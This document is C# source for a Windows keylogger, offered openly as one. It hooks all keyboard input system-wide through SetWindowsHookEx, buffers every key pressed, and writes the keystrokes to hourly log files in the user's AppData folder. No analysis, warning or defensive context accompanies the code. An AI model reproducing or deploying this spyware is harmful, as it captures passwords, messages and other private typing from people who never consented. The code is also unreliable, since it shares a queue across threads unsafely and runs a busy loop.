using System;
using System.Diagnostics;
using System.Windows.Forms;
using System.Runtime.InteropServices;

using System.Collections.Generic;
using System.Linq;
using System.IO;

namespace Keylogger
{
    static class Program
    {
        #region keyboard hook

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode,
            IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        private delegate IntPtr LowLevelKeyboardProc(
        int nCode, IntPtr wParam, IntPtr lParam);

        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using (Process curProcess = Process.GetCurrentProcess())
            using (ProcessModule curModule = curProcess.MainModule)
            {
                return SetWindowsHookEx(WH_KEYBOARD_LL, proc,
                    GetModuleHandle(curModule.ModuleName), 0);
            }
        }

        private const int WH_KEYBOARD_LL = 13; // low level keyboard proc callback
        private const int WM_KEYDOWN = 0x0100; // virtual keycode for non-system keys
        private static LowLevelKeyboardProc _proc = HookCallback;
        private static IntPtr _hookId = IntPtr.Zero;

        #endregion

        // string queue to to share between IO handling and keyboard callback
        public static Queue<string> LogBuffer = new Queue<string>();

        /// <summary>
        /// The main entry point for the application.
        /// </summary>
        [STAThread]
        static void Main()
        {
            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);

            NotifyIcon icon = new NotifyIcon();
            icon.Icon = new System.Drawing.Icon("app.ico");
            icon.Visible = true;

            _hookId = SetHook(_proc);

            Application.Run(new Logger());
            icon.Visible = false;
        }

        private static IntPtr HookCallback(
            int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {
                int vkCode = Marshal.ReadInt32(lParam);
                LogBuffer.Enqueue(((Keys)vkCode).ToString());
            }
            return CallNextHookEx(_hookId, nCode, wParam, lParam);
        }

        public class Logger : ApplicationContext
        {
            public Logger()
            {
                bool running = true;
                int lastHour = 0;
                while (running)
                {
                    try
                    {
                        if (LogBuffer.Count > 10)
                        {
                            string[] WriteBuffer = new string[LogBuffer.Count];
                            LogBuffer.CopyTo(WriteBuffer, 0);
                            LogBuffer.Clear();
                            lastHour = DateTime.Now.Hour;

                            // write a file out in the format YYYYMMDDHHKL
                            string id = string.Format("{0}{1}{2}{3}{4}", @"KL", DateTime.Now.Year, DateTime.Now.Month, DateTime.Now.Day, DateTime.Now.Hour);
                            var path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), id);
                            
                            using (FileStream fs = new FileStream(path, FileMode.Append, FileAccess.Write))
                            {
                                using (StreamWriter sw = new StreamWriter(fs))
                                {
                                    // do some cleanup since we can get ConsoleKey strings
                                    foreach (var item in WriteBuffer)
                                    {
                                        if (item == "Space")
                                            sw.Write(" ");
                                        else if (item == "Return")
                                            sw.WriteLine();
                                        else if (item == "Oemcomma")
                                            sw.Write(",");
                                        else if (item == "em")
                                            sw.WriteLine(";");
                                        else
                                            sw.Write(item);
                                    }
                                }
                            }
                        }
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine(ex.Message);
                    }
                    Application.DoEvents();
                }
            }
        }
    }
}
